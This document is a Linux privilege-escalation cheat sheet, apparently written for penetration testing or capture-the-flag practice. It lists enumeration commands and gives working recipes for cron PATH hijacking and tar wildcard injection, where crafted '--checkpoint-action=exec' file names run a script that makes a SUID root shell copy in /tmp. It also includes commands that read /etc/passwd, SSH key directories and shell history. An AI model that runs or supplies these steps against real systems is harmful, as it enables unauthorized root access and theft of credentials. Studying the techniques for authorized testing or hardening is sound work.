# Linux Privilege Escalation Cheat Sheet
## Kernel Exploit
### Kernel Exploit Enumeration
#### Check System Information

```bash
hostname
```
```bash
uname -a
```
```bash
cat /etc/lsb-release
```
```bash
cat /proc/version
```
```bash
cat /etc/os-release
```
```bash
cat /etc/issue
```
```bash
lscpu
```
#### Check Running Process Information
```bash
ps aux
```
```bash
ps aux | grep root
```
### Kernel Exploitation Process
  1. Google for Exploits against the OS and Kernel Version 
  2. Download, compile, and run it against the target if it exists
  3. Try something else if it does not exist.

## Escalation via Scheduled Tasks
### Check writeable Files and Directories
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
Pay particulalar attention to the following locations
  * /etc/init.d
  * /etc/cron*
  * /etc/crontab
  * /etc/cron.allow
  * /etc/cron.d 
  * /etc/cron.deny
  * /etc/cron.daily
  * /etc/cron.hourly
  * /etc/cron.monthly
  * /etc/cron.weekly
  * /etc/sudoers
  * /etc/exports
  * /etc/anacrontab
  * /var/spool/cron
  * /var/spool/cron/crontabs/root

### Enumerate Scheduled Tasks By checking the scheduled tasks
```bash
crontab -l
```
```bash
ls -lah /var/spool/cron
```
```bash
ls -lah /etc/cron*
```
```bash
cat /etc/at.allow
```
```bash
cat /etc/at.deny
```
```bash
systemctl list-timers --all
```
### Escalation via Cron Paths
  1. Check the PATH= Variable.
  2. Check what files are being run.
  3. Check if the file exists in the file path from left to right.
      * If it does not exist, check if you can write the file


           i. Create The File With:
           
            echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <path>/<file>
            chmod +x <path><file>
        
           ii. Escalate Privilege
         
            /tmp/bash

      * If the file exists before you find a writeable location, try something else.

### Escalation via Wildcards
If a command accepts wildcards as an argument and it is present in the crontab or cronjob do the following:
1. Research the executable
2. Create files where the name of the file if fed as part of the argument
3. The executable will interpret the name of the file as part of the command
4. Profit

Tar is a good example of this with the payloads
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > root.sh
chmod +x root.sh
```
```bash
--checkpoint=1
--checkpoint-action=exec=sh root,sh
```

## Check OS version
## Check Kernel Version

## List current running processes
Look for processes running as root. A misconfigured or vulnerable running as run can be an easy win.
ps aux | grep root
List current processes
ps au

## List the contents of the Home Directory
 
 ls /home
 
## List the contents of a users home directory
 
 ls -lah /home/<user>

## Check and retrieve the content of the SSH Directory

  These can be used to access other systems within the environment
  ls -lah /home/<user>/.ssh
  
## Check the Bash HIstory
  history
  
## List a users sudo privileges
  sudo -l
  
## Check the content of /etc/passwd
  cat /etc/passwd
  
## Check the Content of /etc/cron*
  ls /etc/cron.*
  cat /etc/cron*/<cronjob>
  
## kust File Systems and Additional Drives
  lsblk
  
## Find Writeable Directories
  find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

## Find writeable files
  find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
  
#
